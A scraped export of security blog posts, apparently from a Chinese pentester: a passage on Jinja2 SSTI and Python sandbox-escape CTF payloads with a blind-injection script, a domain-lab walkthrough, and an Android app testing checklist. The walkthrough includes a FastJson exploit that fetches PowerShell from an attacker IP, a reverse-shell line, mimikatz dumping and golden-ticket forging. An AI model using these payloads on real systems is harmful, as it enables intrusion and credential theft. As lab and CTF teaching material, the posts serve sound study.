&#39;warnings.WarningMessage&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;]) (60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;]) (60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;]) (72, &lt;class &#39;site._Printer&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;]) (72, &lt;class &#39;site._Printer&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;]) (77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;]) (77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;]) (78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;, None) (79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;, None) ----------3----------- (59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;file&#39;) (59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;eval&#39;) (59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;open&#39;) (59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;execfile&#39;) (60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;file&#39;) (60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;eval&#39;) (60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;open&#39;) (60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;execfile&#39;) (61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;file&#39;) (61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;eval&#39;) (61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;open&#39;) (61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;execfile&#39;) (62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;file&#39;) (62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;eval&#39;) (62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;open&#39;) (62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;execfile&#39;) (72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;) (72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;exec&#39;) (72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;) (72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;eval&#39;) (72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;open&#39;) (72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;execfile&#39;) (77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;) (77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;exec&#39;) (77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;) (77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;eval&#39;) (77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;open&#39;) (77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;execfile&#39;) (78, 21, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;) (78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;file&#39;) (78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;eval&#39;) (78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;) (78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;execfile&#39;) (79, 21, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;) (79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;file&#39;) (79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;eval&#39;) (79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;) (79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;execfile&#39;) ----------4----------- (60, &#39;file&#39;) (60, &#39;repr&#39;) (60, &#39;eval&#39;) (60, &#39;open&#39;) (60, &#39;execfile&#39;) 选取其中一个执行命令，__mro__输出父类，最后一个父类为object &gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72] &lt;class &#39;site._Printer&#39;&gt; &gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__[&#39;os&#39;].system(&#39;whoami&#39;) misaki\\user 读取文件 &gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&quot;C:\\\\windows\\\\ win.ini&quot;).read() &#39;; for 16-bit app support\\n[fonts]\\n[extensions]\\n[mciextensions]\\n[files]\\n[Mail]\\nMAPI&#x3D;1\\nCMCDLLNAME32&#x3D;mapi32.dll\\nCMC&#x3D;1\\nMAPIX&#x3D;1\\nMAPIXVER&#x3D;1.0.0.1\\nOLEMessagin 其中还可以执行的模块还有很多，比如使用含有__builtins__的其他模块，来调用加载的os等。 筛选代码来源：Python沙箱逃逸总结 SSTI服务器端模板注入。既然谈到SSTI，在python中就要提一下flask，jinja2模板。此处利用网上一段代码 from flask import Flask from flask import request, render_template_string, render_template app &#x3D; Flask(__name__) @app.route(&#39;&#x2F;login&#39;) def hello_ssti(): person &#x3D; &#123; &#39;name&#39;: &#39;hello&#39;, &#39;secret&#39;: &#39;This_is_my_secret&#39; &#125; if request.args.get(&#39;name&#39;): person[&#39;name&#39;] &#x3D; request.args.get(&#39;name&#39;) template &#x3D; &#39;&lt;h2&gt;Hello %s!&lt;&#x2F;h2&gt;&#39; % person[&#39;name&#39;] return render_template_string(template, person&#x3D;person) if __name__ &#x3D;&#x3D; &quot;__main__&quot;: app.run(debug&#x3D;True) 当如下请求的时候就会显示其他参数，比如secret http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;login?name&#x3D;&#123;&#123;person[%27secret%27]&#125;&#125; 其中的render_template_string和另一个模板函数render_template区别在第一个参数是否可以传入字符串，但是传入字符串就一定会有问题吗？修改template参数 from flask import Flask from flask import request, render_template_string app &#x3D; Flask(__name__) @app.route(&#39;&#x2F;login&#39;) def hello_ssti(): person &#x3D; &#123; &#39;name&#39;: &#39;hello&#39;, &#39;secret&#39;: &#39;This_is_my_secret&#39; &#125; if request.args.get(&#39;name&#39;): person[&#39;name&#39;] &#x3D; request.args.get(&#39;name&#39;) template &#x3D; &#39;&lt;h2&gt;Hello &#123;&#123;person.name &#125;&#125;!&lt;&#x2F;h2&gt;&#39; return render_template_string(template, person&#x3D;person) if __name__ &#x3D;&#x3D; &quot;__main__&quot;: app.run(debug&#x3D;True) 做如下请求的时候，就会显示Hello {{person['secret']}}!，我们传入的参数被当作字符串显示出来。 http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;login?name&#x3D;&#123;&#123;person[%27secret%27]&#125;&#125; name参数传入后，先修改person中的name值，person变成 person &#x3D; &#123; &#39;name&#39;: &#39;&#123;&#123;person[&#39;secret&#39;]&#125;&#125;&#39;, &#39;secret&#39;: &#39;This_is_my_secret&#39; &#125; 后面调用模板，来执行的时候，根据变量取值，又把person.name获取出来，传入render_template_string的就是&#39;&lt;h2&gt;Hello {{person.name}}!&lt;/h2&gt;&#39;，取值后整体被当作字符串显示。这里跟上面格式化字符串的时候不一样的地方就出来了，当我们直接传入{{person['secret']}}的时候，调用模板变量取值的时候，先格式化字符串，把传入字符串当作变量来处理。也就是&#39;&lt;h2&gt;Hello {{person['secret']}}!&lt;/h2&gt;&#39;加载到render_template_string。这又涉及到python的字符串格式化。 字符串格式化在python中常见的字符串格式化有几种形式 %操作符&gt;&gt;&gt; name &#x3D; &quot;aaa&quot; &gt;&gt;&gt; &#39;%s&#39; %name &#39;aaa&#39; string.Template&gt;&gt;&gt; from string import Template &gt;&gt;&gt; name &#x3D; &#39;aaa&#39; &gt;&gt;&gt; tem &#x3D; Template(&#39;$name&#39;) &gt;&gt;&gt; tem.substitute(name&#x3D;name) &#39;aaa&#39; formatpython2.6后引用的格式化字符串的函数 &gt;&gt;&gt; name &#x3D; &#39;aaa&#39; &gt;&gt;&gt; &#39;&#123;&#125;&#39;.format(name) &#39;aaa&#39; f-Stringspython3.6后新增的字符串格式化方式，可以执行其中的python语句。 &gt;&gt;&gt; name &#x3D; &#39;aaa&#39; &gt;&gt;&gt; f&#39;&#123;name&#125;&#39; &#39;aaa&#39; &gt;&gt;&gt; f&#39;&#123;name.upper()&#125;&#39; &#39;AAA&#39; 如何利用字符串格式化来读取敏感文件 def view(request, *args, **kwargs): template &#x3D; &#39;Hello &#123;user&#125;, This is your email: &#39; + request.GET.get(&#39;email&#39;) return HttpResponse(template.format(user&#x3D;request.user)) 如果控制了email参数就是控制了字符串格式化一部分，当传入&#123;user.password&#125;的时候就会显示用户的哈希密码。user是当前上下文中仅有的一个变量，也就是format函数传入的user=request.user，Django中request.user是当前用户对象，这个对象包含一个属性password，也就是该用户的密码。所以，&#123;user.password&#125;实际上就是输出了request.user.password。 以上代码：Python格式化字符串漏洞，一文掌握CTF中Python全部考点 CTF 利用下面用几个CTF题来感受一下。 flask 真香https://github.com/NJUPT-coding-gay/NCTF2018/tree/master/Web/flask%E7%9C%9F%E9%A6%99 不过这个环境现在搭建会有点问题，flask会使用的是最新1.1.2版本，显示的request.url会先url编码再显示到页面上，需要更改flask版本。 修改Dockerfile文件: RUN pip3 install flask&#x3D;&#x3D;0.12.1 RUN pip3 install MarkupSafe&#x3D;&#x3D;1.0 RUN pip3 install jinja2&#x3D;&#x3D;2.9 RUN pip3 install Werkzeug&#x3D;&#x3D;0.14.1 启动后就能愉快的看到页面了 禁用了不少关键词，然后使用的session对象来解决，就直接利用上手 在查找子父类的函数上，__mro__被禁用了，但是__bases__并没有。先找到object类 然后再去获取子类，由于class被禁用，__subclasses__不能直接使用。 其中可以利用的有open和popen，open在__builtins__里面 执行命令查找文件 读取文件即可 使用open，但是需要知道文件位置 如果不想用session，或者session也不能用了，就需要更多的绕过方式，下面会提到这种。 &#123;&#123;(((()|attr((&quot;_&quot;*2,&quot;cla&quot;,&quot;ss&quot;,&quot;_&quot;*2)|join)|attr((&quot;_&quot;*2,&quot;bases&quot;,&quot;_&quot;*2)|join))[0]|attr((&quot;_&quot;*2,&quot;subcla&quot;,&quot;sses&quot;,&quot;_&quot;*2)|join)())[102]|attr((&quot;_&quot;*2,&quot;init&quot;,&quot;_&quot;*2)|join)|attr((&quot;_&quot;*2,&quot;globals&quot;,&quot;_&quot;*2)|join)).get(&#39;pop&#39;+&#39;en&#39;)(&#39;cat%20&#x2F;Th1s__is_S3cret&#39;).read()&#125;&#125; flask plus[https://github.com/NJUPT-coding-gay/NCTF2018/tree/master/Web/Flask%20PLUS](https://github.com/NJUPT-coding-gay/NCTF2018/tree/master/Web/Flask PLUS) 同样的页面，说明应该是增加了过滤的东西，同样修改Dockerfile文件。 使用上一个POC，发现__init__被过滤了。至少到这一步是正常的 然后只需要把__init__做拼接就行了 如果某种情况下不能拼接，或者不想去这么做，也可以去查是否有替代属性。要求能替代__init__，要有__globals__属性。也就是重载过__init__ import os for i in dir(os._wrap_close): if &#39;__globals__&#39; in dir(eval(&#39;os._wrap_close.&#39;+i)): print(i) 大概符合标准的有 __enter__ __exit__ __getattr__ __init__ __iter__ close 使用__enter__ 使用__getattr__ ，不过这个被禁用了。需要拼接，这就跟上面__init__类似了。更换__iter__ close也被禁用了。__exit__还可以使用 flask 改如果在过滤中只过滤了特殊符号，比如__这种，代码 #!&#x2F;usr&#x2F;bin&#x2F;env python # -*- coding: utf-8 -*- from flask import Flask,render_template,render_template_string,redirect,request,session,abort,send_from_directory import os app &#x3D; Flask(__name__) @app.route(&quot;&#x2F;&quot;) def index(): &quot;主页&quot; return render_template(&quot;index2.html&quot;) @app.route(&#39;&#x2F;user&#39;) def user(): def safe_jinja(s): blacklist &#x3D; [&#39;__class__&#39;,&#39;__init__&#39;,&#39;__&#39;] flag &#x3D; True for no in blacklist: if no.lower() in s.lower(): flag&#x3D; False break return flag template &#x3D; &#39;&#39;&#39; &#123;%% block body %%&#125; &lt;div class&#x3D;&quot;center-content error&quot;&gt; &lt;h3&gt;%s&lt;&#x2F;h3&gt; &lt;&#x2F;div&gt; &#123;%% endblock %%&#125; &#39;&#39;&#39; % (request.url) if safe_jinja(request.args.get(&#39;name&#39;)): return render_template_string(template) else: return render_template_string(&quot;&lt;h2&gt;NO!&lt;&#x2F;h2&gt;&quot;) if __name__ &#x3D;&#x3D; &quot;__main__&quot;: app.run(host&#x3D;&#39;0.0.0.0&#39;,port&#x3D;5000) 如果是上面这种对参数过滤的形式，request.args.param来获取新参数的值 如果是把[]也过滤掉，就需要用jinja2模板函数来处理，比如attr() 构造请求 现在可以看到上面过滤掉了__class__，这种也可以采用 如何利用这种过滤来获取flag，其中由于中括号被禁用，利用列表的pop方法。但是元组没有pop方法，所以需要先转换成list，再去调用，字典可以使用get()获取键值。原flag文件名带双下划线改成单下划线了。如果其中的某个字符串关键词，比如class被禁用，直接拼接来绕过就行。 &#123;&#123;(((request|attr((&quot;_&quot;*2,&quot;class&quot;,&quot;_&quot;*2)|join)|attr((&quot;_&quot;*2,&quot;mro&quot;,&quot;_&quot;*2)|join)|list).pop(-1)|attr((&quot;_&quot;*2,&quot;subclasses&quot;,&quot;_&quot;*2)|join)()).pop(258)|attr((&quot;_&quot;*2,&quot;init&quot;,&quot;_&quot;*2)|join)|attr((&quot;_&quot;*2,&quot;globals&quot;,&quot;_&quot;*2)|join)).get((&quot;_&quot;*2,&quot;builtins&quot;,&quot;_&quot;*2)|join).get(&#39;open&#39;)(&#39;Th1s_is_F1114g&#39;).read()&#125;&#125; 原代码中是过滤掉join的，所以这里也可以使用format来处理 完整的利用就是 &#123;&#123;(((request|attr(request.args.f|format(request.args.a))|attr(request.args.f|format(request.args.b))|list).pop(-1)|attr(request.args.f|format(request.args.c))()).pop(118)|attr(request.args.f|format(request.args.d))|attr(request.args.f|format(request.args.e))).get(&#39;popen&#39;)(&#39;cat%20Th1s_is_F1114g&#39;).read()&#125;&#125;&amp;f&#x3D;%s&amp;a&#x3D;__class__&amp;b&#x3D;__mro__&amp;c&#x3D;__subclasses__&amp;d&#x3D;__init__&amp;e&#x3D;__globals__ 再如果觉得其他参数中这种形式会被禁用，也可以更多参数分化执行。request.args也可以改为request.values。 &#123;&#123;(((request|attr(request.args.f|format(request.args.h,request.args.h,request.args.a,request.args.h,request.args.h))|attr(request.args.f|format(request.args.h,request.args.h,request.args.b,request.args.h,request.args.h))|list).pop(-1)|attr(request.args.f|format(request.args.h,request.args.h,request.args.c,request.args.h,request.args.h))()).pop(118)|attr(request.args.f|format(request.args.h,request.args.h,request.args.d,request.args.h,request.args.h))|attr(request.args.f|format(request.args.h,request.args.h,request.args.e,request.args.h,request.args.h))).get(&#39;popen&#39;)(&#39;cat%20Th1s_is_F1114g&#39;).read()&#125;&#125;&amp;f&#x3D;%s%s%s%s%s&amp;h&#x3D;_&amp;a&#x3D;class&amp;b&#x3D;mro&amp;c&#x3D;subclasses&amp;d&#x3D;init&amp;e&#x3D;globals flask 魔改如果禁用{{ }}这种符号，同时保持上面符号的禁用。默认的Jinja分隔符配置如下： &#123;% ... %&#125;用于声明 &#123;&#123; ... &#125;&#125;用于将表达式打印到模板输出 &#123;# ... #&#125;用于注释不包括在模板输出 # ... ##用于行语句 使用if的逻辑语句，由于不能直接用表达式打印，所以用以下布尔判断，循环pop中的值，得到334 &#123;%%20if%20((request|attr((&quot;_&quot;*2,&quot;class&quot;,&quot;_&quot;*2)|join)|attr((&quot;_&quot;*2,&quot;mro&quot;,&quot;_&quot;*2)|join)|list).pop(-1)|attr((&quot;_&quot;*2,&quot;subclasses&quot;,&quot;_&quot;*2)|join)()).pop(334)|string&#x3D;&#x3D;&quot;&lt;class%20&#39;os._wrap_close&#39;&gt;&quot;%20%&#125;111&#123;%%20endif%20%&#125; 但是最后获取的时候，需要对字符串进行截取，切片已经不能使用了，只能从字符串的方法中查找，可用的恰好有index，find，可以指定范围查找，比如index，指定范围从0开始，结束为1，如果为指定字符串返回正常，不然返回异常。 &#123;%%20if%20((((request|attr((&quot;_&quot;*2,&quot;class&quot;,&quot;_&quot;*2)|join)|attr((&quot;_&quot;*2,&quot;mro&quot;,&quot;_&quot;*2)|join)|list).pop(-1)|attr((&quot;_&quot;*2,&quot;subclasses&quot;,&quot;_&quot;*2)|join)()).pop(334)|attr((&quot;_&quot;*2,&quot;init&quot;,&quot;_&quot;*2)|join)|attr((&quot;_&quot;*2,&quot;globals&quot;,&quot;_&quot;*2)|join)).get(&#39;popen&#39;)(&#39;cat%20Th1s_is_F1114g&#39;).read()|string).index(&#39;n&#39;,0,1)%20%&#125;&#123;%%20endif%20%&#125; 使用类似如下的盲注脚本 # -*- coding: utf-8 -*- import requests def check(payload): url &#x3D; &#39;http:&#x2F;&#x2F;x.x.x.x:19009&#x2F;user?name&#x3D;&#39;+payload r &#x3D; requests.get(url) if r.status_code &#x3D;&#x3D; 200: return True password &#x3D; &#39;&#39; s &#x3D; &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$()&lt;&#x3D;&gt;&#123;|&#125;_&#39; for i in range(0,40): for c in s: payload &#x3D; &#39;&#123;%%20if%20((((request|attr((&quot;_&quot;*2,&quot;class&quot;,&quot;_&quot;*2)|join)|attr((&quot;_&quot;*2,&quot;mro&quot;,&quot;_&quot;*2)|join)|list).pop(-1)|attr((&quot;_&quot;*2,&quot;subclasses&quot;,&quot;_&quot;*2)|join)()).pop(334)|attr((&quot;_&quot;*2,&quot;init&quot;,&quot;_&quot;*2)|join)|attr((&quot;_&quot;*2,&quot;globals&quot;,&quot;_&quot;*2)|join)).get(&quot;popen&quot;)(&quot;cat%20Th1s_is_F1114g&quot;).read()|string).index(&quot;&#39;+c+&#39;&quot;,&#39;+str(i)+&#39;,&#39;+str(i+1)+&#39;)%20%&#125;&#123;%%20endif%20%&#125;&#39; if check(payload): password +&#x3D; c break print(password) 结果如下 flask 究极改在把join禁掉，还有format，把values和args也禁掉，不能从其他参数获取，这样上面的绕过就算是不能用了。 blacklist &#x3D; [&#39;__class__&#39;,&#39;__&#39;,&#39;[&#39;,&#39;]&#39;,&#39;join&#39;,&#39;values&#39;,&#39;args&#39;,&#39;format&#39;] 查找一个request有关系的属性，尝试form，比如支持POST方法的话。 利用cookie参数 利用请求头 连起来就是，获取object子类。 &#123;&#123;((request|attr(request.cookies.get(&#39;aa&#39;))|attr(request.cookies.get(&#39;bb&#39;))|list).pop(-1))|attr(request.cookies.get(&#39;cc&#39;))()&#125;&#125; Cookie: aa&#x3D;__class__;bb&#x3D;__mro__;cc&#x3D;__subclasses__ 回顾在flask plus中，采用的是session对象来解决问题，虽然在上一题中采用的是元组对象，但是只是因为其中没有禁用join，如果在plus中也禁用了session，还能怎么处理。 但实际并没有这么理想 这里面能采用的还有哪些，比如 &#123;&#123;(((redirect|attr(&#39;__cla&#39;+&#39;ss__&#39;)|attr(&#39;__mr&#39;+&#39;o__&#39;)|list)[-1]|attr(&#39;__subcla&#39;+&#39;sses__&#39;)())[342]|attr(&#39;__in&#39;+&#39;it__&#39;)|attr(&#39;__globals__&#39;))[&#39;pop&#39;+&#39;en&#39;](&#39;cat%20&#x2F;Th1s_is_F1114g&#39;).read()&#125;&#125; 如果attr被禁用，这种也不能使用，或者能使用__getattribute__替代，但是原代码里已经禁用了。 文章参考：Python沙箱逃逸总结，Python沙箱逃逸的n种姿势，一文看懂Python沙箱逃逸，Python格式化字符串漏洞，一文掌握CTF中Python全部考点，Jinja2 template injection filter bypasses，Flask/Jinja2模板注入中的一些绕过姿势","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://misakikata.github.io/tags/python/"}]},{"title":"域靶场WP","slug":"域靶场WP","date":"2020-04-10T08:31:54.000Z","updated":"2020-04-10T08:32:09.000Z","comments":true,"path":"2020/04/域靶场WP/","link":"","permalink":"https://misakikata.github.io/2020/04/%E5%9F%9F%E9%9D%B6%E5%9C%BAWP/","excerpt":"","text":"域环境利用已有靶场，简单方便http://vulnstack.qiyuanxuetang.net/vuln/detail/3/ web环境漏洞FastJson。利用https://github.com/RealBearcat/FastJson-JdbcRowSetImpl-RCE 修改而来 参数为json字符串，可以简单的使用如下探测是否存在问题。 &#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125; &#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125; &#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125; 比如，此处使用burp的DNS监听 执行后会发现，说明存在问题。 至于版本，可以在一般测试中，构造错误的json字符串查看报错信息，但此处没有错误显示，直接使用几个较高版本的POC测试。 此处直接使用47的POC，由于是Windows系统，则利用cs使用powershell来反弹shell。 import java.lang.Runtime; import java.lang.Process; public class Exploit &#123; public Exploit()&#123; try&#123; &#x2F;&#x2F; Runtime.getRuntime().exec(&quot;&#x2F;bin&#x2F;bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;192.168.120.130&#x2F;8888&lt;&amp;1&quot;); Runtime.getRuntime().exec(&quot;powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring(\\&#39;http:&#x2F;&#x2F;192.168.120.130:80&#x2F;a\\&#39;))\\&quot;&quot;); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void main(String[] argv)&#123; Exploit e &#x3D; new Exploit(); &#125; &#125; 执行后，在cs端就可以收到shell了。利用ms15-051提权，提权模块可能是添加的插件。获得system权限。还可以看到存在一个内网地址10.10.10.80。 利用mimikatz获取密码，只能读取到当前登陆账号的明文密码。 mimikatz sekurlsa::logonpasswords 不过如果使用了管理员账号来执行操作修改配置，也可以读取到管理员hash。如果使用明文密码登陆修改就可以抓到。 如果提示报错，尝试修改注册表 reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f 收集信息可知以下信息 域名：DC.de1ay.com 域主机：10.10.10.10 域用户：Administrator，delay,mssql 域管理员：Administrator 两个网卡：192.168.120.0&#x2F;24，10.10.10.0&#x2F;24 主机：存在两个主机(192.168.120.201，10.10.10.10) 存在360主机防御系统，不过并没有干涉 尝试利用de1ay用户来登陆PC，利用psexec登陆不成功。 使用psexec登陆，DC机显示成功但是没有获得shell，可能是没成功把 然后利用net共享，先用mimikatz生成pth凭据。 sekurlsa::pth &#x2F;domain:. &#x2F;user:Administrator &#x2F;ntlm: 70be8675cd511daa9be4b8f49e829327 net和psexec的时候还是不成功，报错。利用cs自身的pth模块执行，还是报错，拒绝访问 pth DE1AY\\de1ay 161cff084477fe596a5db81874498a24 再尝试利用金票，直接登陆到主机上，上传mimikatz执行。 lsadump::dcsync &#x2F;domain:de1ay.com &#x2F;user:krbtgt 得到HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi kerberos::golden &#x2F;admin:administrator &#x2F;domain:de1ay.com &#x2F;sid:S-1-5-21-2756371121-2868759905-3853650604 &#x2F;krbtgt:82dfc71b72a11ef37d663047bc2088fb &#x2F;ticket:golden.kiribi 通过mimikatz中的kerberos::ptt将golden.kiribi导入内存中 kerberos::purge &#x2F;&#x2F;删除票据 kerberos::ptt golden.kiribi &#x2F;&#x2F;导入票据 kerberos::list &#x2F;&#x2F;查看票据 查看DC域主机默认共享，可以连接到域主机，上传文件执行。 先利用域内主机创建一个端口转发，先创建一个dns的监听，然后利用已有shell。再去创建一个listener。如下dc。 或者直接利用已有shell来创建listener，再生成exe。利用dc监听来生成exe 利用copy beacon.exe \\\\DC.de1ay.com\\c$\\Users\\de1ay\\到DC主机上 创建计划任务执行后门，很快就有DC主机上线了。 schtasks &#x2F;create &#x2F;s DC.de1ay.com &#x2F;ru &quot;SYSTEM&quot; &#x2F;tn testdc &#x2F;sc DAILY &#x2F;tr C:\\\\Users\\\\de1ay\\\\beacon.exe &#x2F;F schtasks &#x2F;run &#x2F;s DC.de1ay.com &#x2F;tn testdc &#x2F;i 对于用户PC机，同样可以利用金票来执行，后面的操作和上面类似。 最后就可以获得shell。 再尝试使用银票，生成前删除全部票据，不能访问。 klist purge 这里使用de1ay的hash kerberos::golden &#x2F;domain:de1ay.com &#x2F;sid:S-1-5-21-2756371121-2868759905-3853650604 &#x2F;target:DC.de1ay.org &#x2F;service:cifs &#x2F;rc4:161cff084477fe596a5db81874498a24 &#x2F;user:de1ay &#x2F;ptt 这里使用/ptt直接导入内存，或者先生成票据，再使用上面的kerberos::ptt导入内存。 查看是否可以访问 同样shell以后可以看到是个用户权限 在尝试使用ms14-068，DC机是Windows2012，没有补丁KB3011780，同样删除票据 由于主机上没有python环境，pykek不能使用，暂时没有exe版本的pykek。下载使用编译完成的exe文件 https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068 ms14-068.exe -u de1ay@de1ay.com -s S-1-5-21-2756371121-2868759905-3853650604 -d DC.de1ay.com 生成cache缓存文件，再使用mimikatz来导入 kerberos::ptc TGT_de1ay@de1ay.com.ccache 不过回过头看，之前在cs中执行利用psexec和已有凭据执行psh的时候应该是成功的。 执行后在DC上会有短暂的ps调用显示，但至于为啥没有回显和连接，也许是连接错误。","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://misakikata.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"APP应用安全检测","slug":"APP应用安全检测","date":"2020-04-10T08:30:24.000Z","updated":"2020-04-10T08:30:33.000Z","comments":true,"path":"2020/04/APP应用安全检测/","link":"","permalink":"https://misakikata.github.io/2020/04/APP%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B/","excerpt":"","text":"测试说明测试内容根据绿盟APP测试流程进行检查，APP是前几年谷歌CTF的中的APK。 客户端安全安装包签名jarsigner.exe -verify WhyShouldIPay.apk -verbose -certs 输出结果为“jar 已验证”时，表示签名正常。 程序保护此处使用jadx打开APK，若软件使用混淆好加壳则不存在问题。如下打开后是下面这种，则是没添加保护。 应用完整性检测反编译APK，修改其中的res资源文件，把其中的一个图片替换为其他图片 如果完整性是检查MANIFEST.MF 中的数据则存在风险。若回编译后安装使用正常，则代表无检查。 组件安全主要查看是否存在android:exported=&quot;true&quot;属性的组件，存在属性的组件可以被第三方导出。但是部分组件需要被调用来执行，比如组件中存在&lt;intent-filter&gt;过滤器。这种组件就相当于允许导出。 根据不同的要求这种情况不一定算是风险项。比如此activity组件，由于是首启动页。需要被调用执行，也就不存在上面所说的不允许被导出情况。 webview组件安全Android 4.2 版本以下的 webview 组件存在安全漏洞 ，检测本地是否会被利用的方式是允许运行的sdk最小不能低于17，来避免在受影响的手机上使用。 敏感信息安全数据文件查看安装app目录文件权限是否为rw-rw---- 当前用户可读性模式。 如果文件目录下存在database目录，db类型的文件，说明使用本地数据库，查看数据文件是否有明文敏感信息。 日志文件查看日志文件中是否输出了一些敏感信息，比如账号密码，认证session等 可以通过adb命令查看，也可以使用第三方连接软件查看adb logcat 密码键盘安全性屏幕录像这种问题从测过的软件和客户来看，在意的程度不高，可能也就在银行金融类APP上会比较在意。 比如利用adb截图来测试是否可以对屏幕进行记录adb shell /system/bin/screencap -p /path/a.png 如果打开后，可以看到输入的数据，或者可以看到键盘点击反馈则算安全问题。 随机键盘这种目前只在银行APP支付的时候输入银行卡密码的时候存在，一般APP并没有此要求。可以根据情况来确定是否需要检测此项。 安全策略密码复杂度APP登陆的密码一般要求大小写字母和数字，需要其中两种以上，不少于八位。如果允许使用纯数字或者纯字母，且长度没有要求的情况下，则存在问题。 账号登陆限制根据业务需要，是否允许同一个账号多设备登陆同时操作，如果不允许则尝试多设备登陆，登陆正常使用则存在问题。 账号锁定机制账号可能存在被爆破密码的可能，在有些不适合使用验证码的场景下，对账号执行登陆错误次数的限制是可以有效防止账号被暴力破解的方式之一。 验证码安全性查看使用的验证码是否能被简单识别，使用能正常使用和防止登陆中被多次验证的问题 安全退出账号在登陆退出后，查看是否正确的注销session。利用原session是否还可以请求到数据。 密码修改验证验证修改密码的功能是否存在问题，是否需要原密码判断，修改的复杂度等是否符合要求 activity 界面劫持如果攻击者注册一个receiver，响应android.intent.action.BOOT_COMPLETED，使得开启启动一个service；在这个service中启动一个计时器，不停枚举当前进程中是否有预设的进程启动，如果发现有预设进程，则使用FLAG_ACTIVITY_NEW_TASK启动自己的钓鱼界面，而正常应用的界面则隐藏在钓鱼界面的后面。 比如使用https://github.com/abigbread/Hijack来创建一个apk。循环监听设置好的app。 进程防护动态注入可以利用成熟的HOOK框架来尝试，比如使用xpose，在对于进程文件中，查看maps文件。其中可以看到对于的xpose文件 或者使用Frida来加载其中的所有的类，查看是否正常获取。 